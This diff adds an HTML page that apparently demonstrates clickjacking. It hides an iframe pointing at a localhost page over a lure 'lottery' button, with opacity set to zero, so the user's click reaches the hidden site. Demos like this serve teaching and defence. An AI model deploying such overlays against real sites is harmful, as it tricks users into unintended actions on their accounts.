@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <style>
+        .click-iframe{
+            position: relative;
+
+        }
+        .click-iframe iframe {
+            position: absolute;
+            border: 0;
+            top:-50px;
+            left:0;
+            opacity: 0; /** 将iframe 隐藏 **/
+        }
+    </style>
+</head>
+<body>
+<div>
+    通过隐藏iframe已覆盖站点操作
+</div>
+<div class="click-iframe">
+
+    <button>
+        抽奖啦
+    </button>
+
+    <iframe src="http://localhost:3000/static/clickIframe.html">
+    </iframe>
+</div>
+
+</body>
+</html>
